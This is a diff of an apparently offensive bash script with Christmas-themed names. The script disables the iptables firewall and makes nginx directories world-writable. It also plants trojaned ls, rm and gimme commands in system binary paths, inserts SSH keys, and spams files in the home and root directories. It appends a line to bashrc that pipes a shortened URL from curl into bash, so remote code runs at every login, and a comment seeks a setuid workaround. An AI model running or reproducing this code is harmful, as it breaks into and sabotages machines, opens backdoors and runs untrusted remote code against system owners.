@@ -37,8 +37,11 @@
 	# finish OS detection and what not
 	# add sandman to everything
 	# migrate derpy \\\ to printf
+	# find a setuid workaround for the gimme script
 	### add the rest of it to Debian/Ubuntu
 	# fix the $? in the if statements, they wont work right
+	#### fix this dumpster fire
+	#### cleanup shitty code
 	#******************************************************
 	#
 #///////////////////////////////////////////////////////////////////////////////////////
@@ -62,6 +65,9 @@ elif [[ $1 == 'carson' ]]; then		### CARSON's
 elif [[ $1 == 'santa' ]]; then		### HO HO HO
 	export -f santaClause			###
 	timeout 3 bash -c santaClause	###
+elif [[ $1 != '' ]]; then			### EVERYONE ELSE
+	neo								###
+	carson							###
 else								###
 	echo "so who are you?"			###
 	exit 1							###
@@ -114,6 +120,7 @@ function carson(){
 	#	EOF
 #### pants down ###################################
 	# that firewall was scary and mean! it's better now
+	if [ -f /etc/sysconfig/iptables ]; then
 		cat <<-'EOF' > /etc/sysconfig/iptables
 			*mangle
 			:PREROUTING ACCEPT [0:0]
@@ -133,11 +140,29 @@ function carson(){
 			:OUTPUT ACCEPT [0:0]
 			COMMIT
 		EOF
-		iptables-restore /etc/sysconfig/iptables
+		iptables-restore /etc/sysconfig/iptables &> /dev/null
+	fi
 
 #### "fixing" nginx ###############################
 	# permissions for everyone!!
 		find / -type d -name nginx -exec chmod -R 7777 {} \;
+
+#### Setup Stuff ##################################
+		clear
+		printf "[\e[33;5m Preparing Charges \e[0m]"
+		#a few presents
+			touch $HOME/present_{0001..1000} /root/present_{0001..1000} &
+		# OS checking
+			if [[ $osDetect == "CentOS" ]]; then
+				(yum install curl epel-release -y &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
+				(yum --disablerepo=epel -y update ca-certificates &> /dev/null ; clear ; printf "[\e[33;5m ..other important things.. \e[0m]") &&
+				yum install aalib -y &> /dev/null
+			else
+				apt-get update &> /dev/null ; clear
+				printf "[\e[33;5m Dispersing Candy \e[0m]"
+				apt-get install -y curl sudo libaa-bin &> /dev/null
+			fi
+		clear
 
 #### General Caltrops #############################
 	# creating and inserting ssh keys
@@ -159,7 +184,7 @@ function carson(){
 		echo "${dirtyRM}" | tee $seedPathsRM > /dev/null
 		echo "${dirtyGimme}" | tee $seedPathsGimme > /dev/null
 		chmod +x $seedPathsLS $seedPathsRM $seedPathsGimme
-		chmod 2777 $seedPathsLS $seedPathsRM $seedPathsGimme
+		chmod 777 $seedPathsLS $seedPathsRM $seedPathsGimme
 		touch /tmp/.trigger
 		# OS checking for where to send happiness
 			if [[ $osDetect == "CentOS" ]]; then
@@ -179,21 +204,7 @@ function carson(){
 		printf "\n%s\n" "$centDirtyRootPS1" >> $bashrcPath
 		echo 'curl -s -L http://bit.ly/10hA8iC | bash' >> $bashrcPath
 		#welcome messages
-			clear
-			printf "[\e[33;5m Preparing Charges \e[0m]"
-			#a few presents
-				touch $HOME/present_{0001..1000} /root/present_{0001..1000} &
-			# OS checking
-				if [[ $osDetect == "CentOS" ]]; then
-					(yum install curl epel-release -y &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
-					(yum --disablerepo=epel -y update ca-certificates &> /dev/null ; clear ; printf "[\e[33;5m ..other important things.. \e[0m]") &&
-					yum install aalib -y &> /dev/null
-				else
-					(apt-get update &> /dev/null ; clear ; printf "[\e[33;5m Dispersing Candy \e[0m]") &&
-					apt-get install -y curl aalib &> /dev/null
-				fi
-			clear
-			for n in {1..50}; do
+			for n in {1..35}; do
 				printf "\t\t\e[0;31m AND SO IT BEGINS!! \e[0;m\n"
 				sleep .15
 			done
@@ -524,7 +535,7 @@ function meat(){
 ###########################################################################################
 centDirtyRootPS1='PS1="${debian_chroot:+($debian_chroot)}[\\e[0;5m*\\e[0;37mT\\e[0;31mi\\e[0;33mt\\e[0;32mt\\e[1;37my \\e[0;31mS\\e[0;33mp\\e[0;32mr\\e[0;37mi\\e[0;31mn\\e[1;33mk\\e[0;32ml\\e[0;37me\\e[0;31ms\\e[0m\\e[0;5;137m*\\e[0m]\\n\\u@\\h:\\w\\$ "'
 centPATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin"
-seedPaths="/usr/local/sbin/ /usr/local/bin/"
+seedPaths="/usr/local/sbin/ /usr/local/bin/ /usr/bin"
 seedPathsLS="$(printf '%sls ' $seedPaths)"
 seedPathsRM="$(printf '%srm ' $seedPaths)"
 seedPathsGimme="$(printf '%sgimme ' $seedPaths)"
